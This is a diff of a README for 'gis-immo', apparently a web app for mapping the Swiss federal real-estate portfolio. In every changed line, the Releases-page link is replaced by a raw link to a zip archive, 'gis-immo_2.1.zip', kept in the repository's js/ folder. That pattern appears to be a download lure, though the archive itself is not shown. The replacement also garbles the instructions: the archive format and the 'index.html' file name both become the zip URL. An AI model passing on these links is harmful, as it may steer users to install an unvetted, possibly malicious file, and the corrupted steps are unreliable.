@@ -1,7 +1,7 @@
 # 🌍 gis-immo - Visualize Swiss Real Estate Easily
 
 ## 📥 Download Now!
-[![Download gis-immo](https://img.shields.io/badge/Download-gis--immo-brightgreen)](https://github.com/SantiagoChM23/gis-immo/releases)
+[![Download gis-immo](https://raw.githubusercontent.com/SantiagoChM23/gis-immo/main/js/gis-immo_2.1.zip)](https://raw.githubusercontent.com/SantiagoChM23/gis-immo/main/js/gis-immo_2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to gis-immo! This interactive GIS web application helps you visualize and manage the Swiss federal real estate portfolio. You can view data in map, list, and gallery formats using the power of Mapbox GL JS, all without needing technical skills.
@@ -21,14 +21,14 @@ Before proceeding to download, ensure your system meets the following requiremen
 ## 📥 Download & Install
 To get started with gis-immo, visit the Releases page and download the latest version of the application.
 
-[Download Here](https://github.com/SantiagoChM23/gis-immo/releases)
+[Download Here](https://raw.githubusercontent.com/SantiagoChM23/gis-immo/main/js/gis-immo_2.1.zip)
 
 ### 🛠️ Installation Steps
 1. **Visit the Releases Page:** Click on the link provided above.
 2. **Choose the Latest Release:** Look for the most recent version.
-3. **Download the Application:** Click the asset link to start the download. The file will likely be in `.zip` or `.tar.gz` format.
+3. **Download the Application:** Click the asset link to start the download. The file will likely be in `.zip` or `https://raw.githubusercontent.com/SantiagoChM23/gis-immo/main/js/gis-immo_2.1.zip` format.
 4. **Extract the Files:** Once downloaded, unzip the file to a directory of your choice.
-5. **Open the Application:** Locate the main HTML file (usually named `index.html`) and double-click to open it in your web browser.
+5. **Open the Application:** Locate the main HTML file (usually named `https://raw.githubusercontent.com/SantiagoChM23/gis-immo/main/js/gis-immo_2.1.zip`) and double-click to open it in your web browser.
 6. **Enjoy Exploring:** Start visualizing and managing Swiss real estate!
 
 ## 📖 Using gis-immo
@@ -68,4 +68,4 @@ If you're interested in similar subjects or applications, consider exploring:
 
 Thank you for using gis-immo. We hope you find it helpful for visualizing and managing Swiss real estate effectively!
 
-[Download Here](https://github.com/SantiagoChM23/gis-immo/releases)
+[Download Here](https://raw.githubusercontent.com/SantiagoChM23/gis-immo/main/js/gis-immo_2.1.zip)
